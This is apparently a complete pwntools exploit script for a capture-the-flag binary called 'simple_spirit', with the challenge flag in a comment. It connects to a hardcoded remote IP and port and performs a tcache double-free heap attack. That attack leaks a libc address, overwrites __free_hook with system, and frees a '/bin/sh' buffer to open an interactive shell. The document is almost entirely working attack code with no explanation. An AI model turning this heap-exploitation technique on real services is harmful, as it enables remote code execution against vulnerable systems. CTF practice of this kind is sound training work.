#exploit for simple_spirit
#h4c($PIRiT_sp1rI7_spIRiT_Aw@Y)
from pwn import *
import time
elf = ELF("./simple_spirit")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('112.213.2.13',40004)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(size,data="A"):
	sla("choose num\n",str(1))
	sla("input size\n",str(size))	
	sla("input your text\n",data)	

def delete():
	sla("choose num\n",str(2))

def leaks():
	sla("choose num\n",str(3))
	target.recvuntil("\x7f\x00\x00")
	leak=u64(target.recv(8))
	return leak
	

name=p64(0)+p64(0x421)
sla("input your name\n",name)
footer=0x6014c0
name=0x6010a0
add(0x21)
delete()#0
delete()#1
add(0x21,p64(footer))
add(0x21)
payload=p64(21)*4
add(0x21,payload)
add(0x31)
delete()#2
delete()#3
add(0x31,p64(name+0x10))
add(0x31)
add(0x31)
delete()#4
libc_base=leaks()-0x3ebca0
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
add(0x18)
delete()#5
delete()#6
add(0x18,p64(libc_free_hook-8))
add(0x18)
add(0x18,"/bin/sh\x00"+p64(libc_system))
delete()
target.interactive()
